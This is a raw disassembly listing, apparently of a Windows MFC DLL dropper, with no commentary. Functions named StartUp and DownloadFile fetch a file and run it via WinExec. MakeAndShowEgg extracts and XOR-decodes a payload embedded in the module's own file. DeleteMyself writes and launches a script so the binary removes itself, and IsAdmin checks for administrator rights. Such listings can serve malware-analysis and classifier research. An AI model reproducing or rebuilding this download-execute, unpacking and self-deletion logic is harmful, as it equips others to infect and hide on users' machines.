DeleteMyself
sub esp 0x650
push ebx
push esi
push edi
call sub_1000198b
push eax
lea ecx [ esp + 0x10 ]
call Ordinal_MFC42_6467
lea eax [ esp + 0x170 ]
push 0x104
push eax
push __dos_header
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x170 ]
lea edx [ esp + 0x6c ]
push ecx
push edx
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x6c ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov [ eax ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x8
lea edx [ esp + 0x6c ]
[ edi ]
not ecx
sub edi ecx
push eax
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
push 0x8000080
push 0x2
mov ecx ebx
push eax
push eax
and ecx 0x3
lea eax [ esp + 0x80 ]
push 0x40000000
[ edi ] [ esi ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
push 0x0
call [ PostQuitMessage@IAT ]
pop edi
pop esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
pop ebx
mov [ ecx + 0x4 ] edx
add esp 0x650
retn 0x4
lea ecx [ esp + 0x6c ]
lea edx [ esp + 0x170 ]
push ecx
mov ecx [ esp + 0x664 ]
lea eax [ esp + 0x174 ]
push edx
push eax
push ecx
lea edx [ esp + 0x284 ]
push rw-data
push edx
call [ wsprintfA@IAT ]
add esp 0x18
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x274 ]
push 0x0
push eax
push ecx
call [ lstrlenA@IAT ]
lea edx [ esp + 0x27c ]
push eax
push edx
push esi
call [ WriteFile@IAT ]
push esi
mov esi [ CloseHandle@IAT ]
call esi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x28 ]
lea edx [ esp + 0x6c ]
[ edi ]
mov [ esp + 0x58 ] ax
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x28 ]
push eax
push ecx
push rw-data
push 0x0
push 0x44
push 0x0
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x50 ] 0x44
mov [ esp + 0x7c ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
mov edi [ SetThreadPriority@IAT ]
push 0xfffffff1
push eax
call edi
push 0xf
call [ GetCurrentThread@IAT ]
push eax
call edi
push 0x80
call [ GetCurrentProcess@IAT ]
push eax
call [ SetPriorityClass@IAT ]
mov ecx [ esp + 0x14 ]
push ecx
call esi
mov edx [ esp + 0x18 ]
push edx
call [ ResumeThread@IAT ]
mov eax [ esp + 0x18 ]
push eax
call esi
MakeAndShowEgg
sub esp 0x26c
push ebx
push ebp
push esi
push edi
call sub_1000198b
push eax
lea ecx [ esp + 0x1c ]
call Ordinal_MFC42_6467
lea eax [ esp + 0x178 ]
push 0x104
push eax
push __dos_header
call [ GetModuleFileNameA@IAT ]
mov ebp [ CreateFileA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
lea ecx [ esp + 0x18c ]
push 0x80000000
push ecx
call ebp
mov edi [ SetFilePointer@IAT ]
push 0x0
mov esi eax
push 0x0
push 0x400
push esi
call edi
mov ebx [ ReadFile@IAT ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x2c ]
push 0x50
push eax
push esi
call ebx
push 0x0
push 0x0
push 0x450
push esi
call edi
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
lea edx [ esp + 0x18 ]
push 0x4
push edx
push esi
call ebx
push 0x0
push 0x0
push 0x2
push 0x0
push 0x0
lea eax [ esp + 0x38 ]
push 0x40000000
push eax
call ebp
push 0x0
push 0x0
push 0x6000
push esi
mov ebp eax
call edi
mov ecx [ esp + 0x10 ]
push ecx
call Ordinal_MFC42_823
add esp 0x4
mov edi eax
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push 0x0
push edx
push eax
push edi
push esi
call ebx
mov ecx [ esp + 0x10 ]
xor eax eax
test ecx ecx
jbe r-xdata
lea edx [ esp + 0x20 ]
push 0x0
push edx
push ecx
push edi
push ebp
call [ WriteFile@IAT ]
mov ebx [ CloseHandle@IAT ]
push ebp
call ebx
push edi
call Ordinal_MFC42_825
add esp 0x4
push esi
call ebx
lea eax [ esp + 0x74 ]
push eax
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x74 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea edx [ esp + 0x74 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x74 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call DeleteMyself
pop edi
pop esi
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
pop ebp
pop ebx
mov [ ecx + 0x4 ] edx
add esp 0x26c
retn
mov cl [ eax + edi ]
xor cl 0x34
mov [ eax + edi ] cl
mov ecx [ esp + 0x10 ]
inc eax
cmp eax ecx
jb r-xdata
IsAdmin
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_1000198b
push eax
lea ecx [ ebp - 0x20 ]
call Ordinal_MFC42_6467
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] 0x0
push eax
push 0x0
push 0x8
mov [ ebp - 0x17 ] 0x0
mov [ ebp - 0x16 ] 0x0
mov [ ebp - 0x15 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x13 ] 0x5
call [ GetCurrentThread@IAT ]
push eax
call [ OpenThreadToken@IAT ]
mov esi [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ GetTokenInformation@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
push 0x2
push ecx
call ebx
test eax eax
je r-xdata
call esi
cmp eax 0x3f0
jne r-xdata
call esi
cmp eax 0x7a
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
xor al al
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
xor al al
mov [ ecx + 0x4 ] edx
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
push 0x8
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_10001b50
mov esi esp
test esi esi
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
xor al al
mov [ ecx + 0x4 ] edx
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
xor al al
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
push edx
push edi
push esi
push 0x2
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x4 ] ecx
xor al al
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x220
push 0x20
push 0x2
push ecx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
xor edi edi
test eax eax
mov [ ebp - 0x1 ] 0x0
jbe r-xdata
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
xor al al
lea esp [ ebp - 0x2c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
push eax
call [ FreeSid@IAT ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov al [ ebp - 0x1 ]
lea esp [ ebp - 0x2c ]
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ esi + 0x4 ]
mov [ ebp - 0x1 ] 0x1
mov eax [ esi ]
inc edi
add ebx 0x8
cmp edi eax
jb r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebx ]
push ecx
push edx
call [ EqualSid@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
DownloadFile
push ebp
mov ebp esp
push 0xffffffff
push sub_10001da0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1020
call sub_10001b50
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_1000198b
push eax
lea ecx [ ebp - 0x18 ]
call Ordinal_MFC42_6467
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_389
mov eax [ ebp + 0xc ]
push 0x0
push 0x0
push 0x2
push 0x1
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call Ordinal_MFC42_5207
mov ecx [ ebp + 0x8 ]
push rw-data
push ecx
mov edi eax
mov [ ebp - 0x4 ] 0x1
call [ fopen@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
test edi edi
je r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_690
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov edx [ edi ]
lea eax [ ebp - 0x102c ]
push 0x1000
push eax
mov ecx edi
call [ edx + 0x3c ]
mov esi eax
push ebx
push esi
lea ecx [ ebp - 0x102c ]
push 0x1
push ecx
call [ fwrite@IAT ]
add esp 0x10
cmp esi 0x1000
jge r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor al al
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebx
call [ fclose@IAT ]
mov edx [ edi ]
add esp 0x4
mov ecx edi
call [ edx + 0x54 ]
lea ecx [ ebp - 0x2c ]
call Ordinal_MFC42_1988
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call Ordinal_MFC42_690
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov [ eax + 0x4 ] ecx
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
StartUp
sub esp 0x10c
call sub_1000198b
push eax
lea ecx [ esp + 0x4 ]
call Ordinal_MFC42_6467
push 0x0
lea eax [ esp + 0xc ]
push 0x1a
push eax
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
call [ SetCurrentDirectoryA@IAT ]
push rw-data
push rw-data
call DownloadFile
test al al
je r-xdata
call MakeAndShowEgg
mov edx [ esp + 0x4 ]
mov eax [ esp ]
mov [ edx + 0x4 ] eax
mov al 0x1
add esp 0x10c
retn
push 0x5
push rw-data
call [ WinExec@IAT ]
sub_10001946
mov eax sub_10001db4
call sub_10001cf8
push ecx
push ecx
push rw-data
lea ecx [ ebp - 0x14 ]
call Ordinal_MFC42_6467
push [ ebp + 0x14 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call Ordinal_MFC42_1578
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov [ ecx + 0x4 ] edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn 0x10
sub_10001991
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x1
push esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push ebx
push edi
xor edi edi
mov [ ebp + 0xc ] edi
call Ordinal_MFC42_1116
call Ordinal_MFC42_1176
push edi
push r--data
push edi
mov esi eax
push [ ebp + 0x8 ]
mov ebx [ esi + 0x8 ]
call Ordinal_MFC42_1575
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x3
jne r-xdata
push rw-data
call Ordinal_MFC42_1243
mov esi eax
call Ordinal_MFC42_1176
mov [ eax + 0x8 ] esi
call Ordinal_MFC42_1168
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call Ordinal_MFC42_1577
jmp r-xdata
call Ordinal_MFC42_1168
mov edi [ eax + 0x4 ]
test edi edi
je r-xdata
push 0x1
pop eax
push rw-data
lea ecx [ ebp - 0x8 ]
call Ordinal_MFC42_6467
call Ordinal_MFC42_1197
push 0xffffffff
call Ordinal_MFC42_1570
push [ ebp + 0x8 ]
call Ordinal_MFC42_1255
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
call Ordinal_MFC42_1197
push 0xffffffff
call Ordinal_MFC42_1570
call Ordinal_MFC42_1577
push 0x1
push rw-data
call Ordinal_MFC42_1253
jmp r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0x70 ]
mov [ esi + 0x8 ] ebx
call Ordinal_MFC42_1176
push [ eax + 0x8 ]
call Ordinal_MFC42_1243
mov eax [ ebp + 0xc ]
pop edi
pop ebx
jmp r-xdata
push [ ebp + 0x8 ]
mov edi rw-data
mov [ esi + 0x8 ] ebx
push edi
call Ordinal_MFC42_1182
push 0x40
call Ordinal_MFC42_823
test eax eax
pop ecx
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x58 ]
test eax eax
jne r-xdata
pop esi
leave
retn 0xc
mov [ ebp + 0xc ] 0x1
push 0x0
push edi
mov ecx eax
call Ordinal_MFC42_342
mov eax [ edi ]
mov ecx edi
call [ eax + 0x70 ]
sub_10001ab8
cmp [ esp + 0x8 ] 0x1
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
push 0x2000
push 0x0
call [ LocalAlloc@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
call Ordinal_MFC42_1176
push [ eax + 0x8 ]
call Ordinal_MFC42_1243
retn 0xc
push esi
push eax
call [ LocalFree@IAT ]
call Ordinal_MFC42_1176
push rw-data
mov esi eax
call Ordinal_MFC42_1243
mov [ esi + 0x8 ] eax
pop esi
jmp r-xdata
sub_10001b50
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_10001bb0
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_10001bb0
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10001991
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_10001bb0
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
push eax
push ebx
call sub_10001bb0
cmp [ ebp + 0xc ] 0x0
je r-xdata
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_10001000
mov eax [ Ordinal_MFC42_4274@IAT ]
retn
sub_10001010
mov eax r--data
retn
sub_10001020
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_561
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10001040
push esi
mov esi ecx
call sub_10001060
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_10001060
jmp Ordinal_MFC42_815
sub_10001070
call sub_10001080
jmp sub_10001090
sub_10001080
mov ecx rw-data
jmp sub_10001020
sub_10001090
push sub_100010a0
call sub_10001b35
pop ecx
retn
sub_100010a0
mov ecx rw-data
jmp sub_10001060
sub_100016fd
mov eax r-xdata
retn
sub_100017a0
retn
sub_100017b0
retn 0x4
sub_100017c0
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
retn
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_3953
jmp [ Ordinal_MFC42_3953@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_815
jmp [ Ordinal_MFC42_815@IAT ]
Ordinal_MFC42_6467
jmp [ Ordinal_MFC42_6467@IAT ]
Ordinal_MFC42_823
jmp [ Ordinal_MFC42_823@IAT ]
Ordinal_MFC42_1988
jmp [ Ordinal_MFC42_1988@IAT ]
Ordinal_MFC42_690
jmp [ Ordinal_MFC42_690@IAT ]
Ordinal_MFC42_5207
jmp [ Ordinal_MFC42_5207@IAT ]
Ordinal_MFC42_389
jmp [ Ordinal_MFC42_389@IAT ]
sub_100018de
call sub_100018e8
jmp sub_10001930
sub_100018e8
mov ecx rw-data
jmp sub_100018f2
sub_100018f2
push esi
push 0x600
push sub_10001946
mov esi ecx
push 0x1
call Ordinal_MFC42_269
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10001910
push esi
mov esi ecx
call sub_1000192b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_826
sub_1000192b
jmp Ordinal_MFC42_600
sub_10001930
push sub_1000193c
call sub_10001b35
pop ecx
retn
sub_1000193c
mov ecx rw-data
jmp sub_1000192b
sub_1000198b
mov eax rw-data
retn
sub_10001b09
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_10001b35
push [ esp + 0x4 ]
call sub_10001b09
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_10001b7f
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
pop ecx
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_10001cf8
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
__dllonexit
jmp [ __dllonexit@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
Ordinal_MFC42_269
jmp [ Ordinal_MFC42_269@IAT ]
Ordinal_MFC42_826
jmp [ Ordinal_MFC42_826@IAT ]
Ordinal_MFC42_600
jmp [ Ordinal_MFC42_600@IAT ]
Ordinal_MFC42_1578
jmp [ Ordinal_MFC42_1578@IAT ]
Ordinal_MFC42_1255
jmp [ Ordinal_MFC42_1255@IAT ]
Ordinal_MFC42_1253
jmp [ Ordinal_MFC42_1253@IAT ]
Ordinal_MFC42_1570
jmp [ Ordinal_MFC42_1570@IAT ]
Ordinal_MFC42_1197
jmp [ Ordinal_MFC42_1197@IAT ]
Ordinal_MFC42_1243
jmp [ Ordinal_MFC42_1243@IAT ]
Ordinal_MFC42_342
jmp [ Ordinal_MFC42_342@IAT ]
Ordinal_MFC42_1182
jmp [ Ordinal_MFC42_1182@IAT ]
Ordinal_MFC42_1577
jmp [ Ordinal_MFC42_1577@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_1575
jmp [ Ordinal_MFC42_1575@IAT ]
Ordinal_MFC42_1176
jmp [ Ordinal_MFC42_1176@IAT ]
Ordinal_MFC42_1116
jmp [ Ordinal_MFC42_1116@IAT ]
sub_10001d90
lea ecx [ ebp - 0x18 ]
jmp sub_100017c0
sub_10001d98
lea ecx [ ebp - 0x2c ]
jmp Ordinal_MFC42_690
sub_10001da0
mov eax r--data
jmp __CxxFrameHandler
sub_10001dac
lea ecx [ ebp - 0x14 ]
jmp sub_100017c0
sub_10001db4
mov eax r--data
jmp __CxxFrameHandler
